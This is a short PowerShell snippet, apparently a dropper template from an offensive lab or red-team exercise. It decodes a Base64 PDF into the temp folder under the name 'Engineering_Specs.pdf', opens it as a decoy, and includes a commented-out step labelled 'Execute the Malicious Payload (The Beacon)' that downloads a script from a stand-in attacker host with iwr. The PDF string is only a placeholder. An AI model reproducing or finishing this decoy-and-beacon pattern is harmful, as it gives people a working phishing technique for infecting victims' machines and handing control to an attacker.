# 1. The Base64 encoded PDF string
$Base64PDF = "JVBERi0xLjQKJ... (the rest of your PDF string)"

# 2. Path to 'drop' the file
$PDFPath = "$env:TEMP\Engineering_Specs.pdf"

# 3. Decode and Write to Disk
$PDFBytes = [System.Convert]::FromBase64String($Base64PDF)
[System.IO.File]::WriteAllBytes($PDFPath, $PDFBytes)

# 4. Open the PDF for the user
Start-Process $PDFPath

# 5. Execute the Malicious Payload (The Beacon)
# iwr -Uri 'http://atackbox/CL0CKK33PER.ps1' ...
